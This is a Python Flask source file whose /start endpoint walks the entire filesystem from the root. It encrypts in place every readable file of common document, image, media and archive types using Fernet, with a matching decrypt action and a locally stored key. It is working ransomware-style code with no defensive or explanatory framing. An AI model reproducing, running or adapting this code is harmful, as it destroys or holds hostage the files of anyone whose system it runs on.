from flask import Flask, request, redirect, render_template, url_for
from cryptography.fernet import Fernet
import os
import qrcode
import subprocess

app = Flask(__name__)
KEY_FILE = 'thekey.key'
EXTENSIONS = [
    '.txt', '.docx', '.pptx', '.cpp', '.jpg', '.jpeg', '.png',
    '.pdf', '.xls', '.xlsx', '.ppt', '.html', '.htm', '.mp3',
    '.mp4', '.zip', '.xml', '.avi', '.mov', '.mkv', '.flv',
    '.wmv', '.webm', '.mpeg', '.mpg', '.ts', '.3gp'
]

def generate_key():
    key = Fernet.generate_key()
    with open(KEY_FILE, 'wb') as key_file:
        key_file.write(key)
    return key

def read_key():
    with open(KEY_FILE, 'rb') as key_file:
        return key_file.read()

def find_all_files(root_dir, extensions):
    files = []
    for dirpath, _, filenames in os.walk(root_dir):
        for filename in filenames:
            if any(filename.endswith(ext) for ext in extensions):
                if filename in {"app.py", KEY_FILE}:
                    continue
                file_path = os.path.join(dirpath, filename)
                try:
                    with open(file_path, 'rb'):
                        files.append(file_path)
                except PermissionError:
                    continue
                except Exception:
                    continue
    return files

def process_files(action):
    root_dir = '/'
    file_list = find_all_files(root_dir, EXTENSIONS)
    key = read_key() if action == 'decrypt' else generate_key()
    fernet = Fernet(key)
    
    for file in file_list:
        try:
            with open(file, 'rb') as f:
                contents = f.read()
            if action == 'encrypt':
                encrypted_contents = fernet.encrypt(contents)
                with open(file, 'wb') as f:
                    f.write(encrypted_contents)
            elif action == 'decrypt':
                decrypted_contents = fernet.decrypt(contents)
                with open(file, 'wb') as f:
                    f.write(decrypted_contents)
        except Exception:
            continue

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start_process():
    action = request.form.get('action')
    if action in ['encrypt', 'decrypt']:
        process_files(action)
        return f"Files have been {action}ed!"
    return "Invalid action!"

@app.route('/qr')
def qr_code():
    url = 'http://localhost:5000/'
    qr = qrcode.make(url)
    qr.save('static/qr_code.png')
    return redirect(url_for('static', filename='qr_code.png'))

if __name__ == "__main__":
    app.run(debug=True)
